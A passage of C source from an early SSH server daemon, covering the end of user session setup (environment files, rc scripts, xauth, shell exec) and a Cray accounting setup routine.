    child_set_env(&env, &envsize, SSH_AUTHSOCKET_ENV_NAME, 
                  auth_get_socket_name());

#ifdef USELOGIN
  if (command != NULL || !options.use_login)
#endif /* USELOGIN */
    {
      /* Read environment variable settings from /etc/environment.  (This
         exists at least on AIX, but could be useful also elsewhere.) */
      read_environment_file(&env, &envsize, "/etc/environment");

      /* Read $HOME/.ssh/environment. */
      snprintf(buf, sizeof(buf), "%.200s/.ssh/environment", user_dir);
      read_environment_file(&env, &envsize, buf);
      
      /* Change current directory to the user\'s home directory. */
      if (chdir(user_dir) < 0)
        fprintf(stderr, "Could not chdir to home directory %s: %s\n",
                user_dir, strerror(errno));
    }
  
  /* If debugging, dump the environment to stderr. */
  if (debug_flag)
    {
      fprintf(stderr, "Environment:\n");
      for (i = 0; env[i]; i++)
        fprintf(stderr, "  %.200s\n", env[i]);
      fprintf(stderr, "\n");
    }
      
  
  /* Must take new environment into use so that .ssh/rc, /etc/sshrc and
     xauth are run in the proper environment. */
  environ = env;

#ifdef HAVE_SIA
#ifdef USELOGIN
  if (command != NULL || !options.use_login)
#endif /* USELOGIN */
    {
      /* Switch back temporarily to our own uid (typically root, but
         not always) in case sia_ses_launch() needs to access protected
         account databases. */ 
      if (seteuid(getuid()) < 0)
        fatal("seteuid %d: %.100s", (int)getuid(), strerror(errno));

      /* sia_ses_launch() needs to be called here, after the new
         environment has been setup, because it can set environment
         variables of its own. */  
      if (sia_ses_launch(sia_collect_trm, sia_entity) != SIASUCCESS)
        fatal("Failure performing SIA session launch for user %d.",
              (int)user_uid);

      sia_ses_release(&sia_entity);

      /* Our sia calls are complete, so we can finally close any extra
         open file descriptors. */ 
      for (i = getdtablesize() - 1; i > 2; i--)
        {
          if (i == auth_get_fd())
            continue;
          close(i);
        }

      /* We can now completely become the user.  We need to do this
         with setreuid() instead of setuid() because sia_ses_launch()
         has set our euid to the user's uid. */
      if (setreuid(user_uid, user_uid) < 0)
        fatal("setuid %d: %.100s", (int)user_uid, strerror(errno));
      if (getuid() != user_uid || geteuid() != user_uid)
        fatal("Failed to set uids to %d.", (int)user_uid);
    }
#endif /* HAVE_SIA */

#ifdef USELOGIN
  if (command != NULL || !options.use_login)
#endif /* USELOGIN */
    {
      /* Run $HOME/.ssh/rc, /etc/sshrc, or xauth (whichever is found first
         in this order).  Note that we are already running on the user's
         uid. */
      if (stat(SSH_USER_RC, &st) >= 0)
        {
          snprintf(buf, sizeof(buf), "%.100s %.100s", shell, SSH_USER_RC);
          
          if (debug_flag)
            fprintf(stderr, "Running %s\n", buf);
          
          f = popen(buf, "w");
          if (f)
            {
              if (auth_proto != NULL && auth_data != NULL)
                fprintf(f, "%s %s\n", auth_proto, auth_data);
              pclose(f);
            }
          else
            fprintf(stderr, "Could not run %s\n", SSH_USER_RC);
        }
      else
        if (stat(SSH_SYSTEM_RC, &st) >= 0)
          {
            snprintf(buf, sizeof(buf),
                     "%.100s %.100s", "/bin/sh", SSH_SYSTEM_RC);
            
            if (debug_flag)
              fprintf(stderr, "Running %s\n", buf);
            
            f = popen(buf, "w");
            if (f)
              {
                if (auth_proto != NULL && auth_data != NULL)
                  fprintf(f, "%s %s\n", auth_proto, auth_data);
                pclose(f);
              }
            else
              fprintf(stderr, "Could not run %s\n", SSH_SYSTEM_RC);
          }
#ifdef XAUTH_PATH
        else
          {
            /* Add authority data to .Xauthority if appropriate. */
            if (auth_proto != NULL && auth_data != NULL)
              {
                int i;
                char name[255], *p;
                char line[256];
                struct hostent *hp;
                
                strncpy(name, display, sizeof(name));
                name[sizeof(name) - 1] = '\0';
                p = strchr(name, ':');
                if (p)
                  *p = '\0';
                
                if (debug_flag)
                  fprintf(stderr, "Running %.100s add %.100s %.100s %.100s\n",
                          options.xauth_path, display, auth_proto, auth_data);
                
                signal(SIGPIPE, SIG_IGN);

                /* Moved this call here to avoid a nasty buf in SunOS
                   4.1.4 libc where gethostbyname closes an unrelated
                   file descriptor. */
                hp = gethostbyname(name);

                snprintf(line, sizeof(line),
                         "%.200s -q -", options.xauth_path);
                f = popen(line, "w");
                if (f)
                  {
                    fprintf(f, "add %s %s %s\n", display, auth_proto,
                            auth_data);
                    cp = strchr(display, ':');
                    if (cp)
                      {
#ifndef CRAY
                        /* Cray xauth cannot take host/unix:0 as displayname */
                        fprintf(f, "add %.*s/unix%s %s %s\n",
                                cp - display, display, cp, auth_proto,
                                auth_data);
#endif
                        if (hp)
                          {
                            for(i = 0; hp->h_addr_list[i]; i++)
                              {
                                if (debug_flag)
                                  {
                                    fprintf(stderr, "Running %s add %s%s %s %s\n",
                                            options.xauth_path,
                                            inet_ntoa(*((struct in_addr *)
                                                        hp->h_addr_list[i])),
                                            cp, auth_proto, auth_data);
                                  }
                                fprintf(f, "add %s%s %s %s\n",
                                        inet_ntoa(*((struct in_addr *)
                                                    hp->h_addr_list[i])),
                                        cp, auth_proto, auth_data);
                              }
                          }
                      }
                    pclose(f);
                  }
                else
                  fprintf(stderr, "Could not run %s -q -\n",
                          options.xauth_path);
                
                signal(SIGPIPE, SIG_DFL);
              }
          }
#endif /* XAUTH_PATH */
    }

#ifdef USELOGIN
  if (command != NULL || !options.use_login)
#endif /* USELOGIN */
    {
      /* Get the last component of the shell name. */
      cp = strrchr(shell, '/');
      if (cp)
        cp++;
      else
        cp = shell;
    }
  
  /* If we have no command, execute the shell.  In this case, the shell name
     to be passed in argv[0] is preceded by '-' to indicate that this is
     a login shell. */
  if (!command)
    {
#ifdef USELOGIN
      if (!options.use_login)
#endif /* USELOGIN */
        {
          char buf[256];

          if (options.check_mail)
            {
              char *mailbox;
              
              mailbox = getenv("MAIL");
              if(mailbox != NULL)
                {
                  struct stat mailbuf;
                  
                  if (stat(mailbox, &mailbuf) == -1 || mailbuf.st_size == 0)
                    printf("No mail.\n");
                  else if (mailbuf.st_atime > mailbuf.st_mtime)
                    printf("You have mail.\n");
                  else
                    printf("You have new mail.\n");
                }
            }
          if (days_before_account_expires >= 0 &&
              days_before_account_expires <
              options.account_expire_warning_days)
            {
              printf("\n\tWARNING: Your account expires in %d days\n\n",
                     days_before_account_expires);
            }
          if (days_before_password_expires >= 0 &&
              days_before_password_expires <
              options.password_expire_warning_days)
            {
              printf("\n\tWARNING: Your password expires in %d days\n\n",
                     days_before_password_expires);
            }
          
          /* Start the shell.  Set initial character to '-'. */
          buf[0] = '-';
          strncpy(buf + 1, cp, sizeof(buf) - 1);
          buf[sizeof(buf) - 1] = 0;
          /* Execute the shell. */
          argv[0] = buf;
          argv[1] = NULL;
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
          execve(real_shell, argv, env);
#else
          execve(shell, argv, env);
#endif /* HAVE_LOGIN_CAP_H */
          /* Executing the shell failed. */
          perror(shell);
          exit(1);
        }
#ifdef USELOGIN
      else
        {
          execl(PATH_LOGIN, "login", "-h", remote_ip, "-p", "-f",
                "--", user_name, NULL);
          /* NOTREACHED */
        }
#endif /* USELOGIN */
    }

  /* Execute the command using the user's shell.  This uses the -c option
     to execute the command. */
  argv[0] = (char *)cp;
  argv[1] = "-c";
  argv[2] = (char *)command;
  argv[3] = NULL;
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
  execve(real_shell, argv, env);
#else
  execve(shell, argv, env);
#endif /* HAVE_LOGIN_CAP_H */
  perror(shell);
  exit(1);
}

#ifdef CRAY
/*
 On a Cray, set the account number for the current process to the user's 
 default account.  If this is not done, the process will have an account 
 of zero and accounting (Cray System Accounting and/or SDSC Resource
 Management (realtime)) will not operate correctly.

 This routine also calls setjob to set up an Cray Job (also known 
 as a Session).  This is needed for CRI's Cray System Accounting 
 and SDSC's Resource Management accounting/management system.

 It also calls setlimit, to set up limits and permissions.
 
 Wayne Schroeder
 San Diego Supercomputer Center
 schroeder@sdsc.edu
 
*/
int cray_setup(uid, username)
uid_t uid;
char *username;
{
  register struct udb *p;
  extern struct udb *getudb();
  int i, j;
  int accts[MAXVIDS];
  int naccts;
  int err, jid;
  char *sr;
  int pid;

  /* Find all of the accounts for a particular user */
  err = setudb();    /* open and rewind the Cray User DataBase */
  if(err != 0)
    {
      debug("UDB open failure");
      return(-1);
    }
  naccts = 0;
  while ((p = getudb()) != UDB_NULL) 
    {
      if (p->ue_uid == -1) break;
      if(uid == p->ue_uid) 
        {
          for(j = 0; p->ue_acids[j] != -1 && j < MAXVIDS; j++) 
            {
              accts[naccts] = p->ue_acids[j];
              naccts++;
            }
        }
    }
  endudb();        /* close the udb */
  if (naccts == 0 || accts[0] == 0)
    {
      debug("No Cray accounts found");
      return(-1);
    }
 
  /* Perhaps someday we'll prompt users who have multiple accounts
     to let them pick one (like CRI's login does), but for now just set 
     the account to the first entry. */
  if (acctid(0, accts[0]) < 0) 
    {
      debug("System call acctid failed, accts[0]=%d",accts[0]);
      return(-1);
    } 
 
  /* Now call setjob to create a new job(/session).  This assigns a new Session
     ID and session table entry to the calling process.  This process will be
     the first process in the job/session. */
  jid = setjob(uid, 0);
  if (jid < 0) 
    {
      debug("System call setjob failure");
      return(-1);
    }

  /* Now set limits, including CPU time for the (interactive) job and process,
     and set up permissions (for chown etc), etc.  This is via an internal CRI
     routine, setlimits, used by CRI's login. */

  pid = getpid();
  sr = setlimits(username, C_PROC, pid, UDBRC_INTER);
  if (sr != NULL) 
    {
      debug("%.200s", sr);
      return(-1);
    }
  sr = setlimits(username, C_JOB, jid, UDBRC_INTER);
  if (sr != NULL) 
    {
      debug("%.200s", sr);
      return(-1);
    }

  return(0);
}
#endif /* CRAY */
